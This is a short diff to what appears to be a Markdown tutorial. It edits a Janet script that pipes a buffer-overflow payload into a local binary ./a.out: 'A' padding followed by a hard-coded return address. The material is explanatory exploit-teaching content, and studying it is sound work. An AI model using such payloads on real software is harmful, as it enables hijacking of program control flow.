@@ -436,7 +436,7 @@ Or perhaps something more Lispy?
 ```janet
 #!/usr/bin/env janet
 (use sh)
-(def input "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x11\x40\x00\x00\x00\x00\x00")
+(def input (string/join [(string/repeat 'A 40) "\xc0\x11\x40\x00\x00\x00\x00\x00"]))
 ($ ./a.out < ,input)
 ```
 
